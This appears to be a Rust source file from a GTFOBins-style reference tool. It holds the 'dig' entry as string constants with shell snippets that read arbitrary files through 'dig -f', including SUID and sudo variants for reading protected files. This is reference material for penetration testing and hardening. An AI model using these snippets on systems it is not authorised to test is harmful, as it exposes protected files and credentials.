
pub static BIN_NAME: &'static str = "dig";
pub static BIN_DESC: &'static str = "Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    dig -f $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which dig) .

    LFILE=file_to_read
    ./dig -f $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo dig -f $LFILE
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
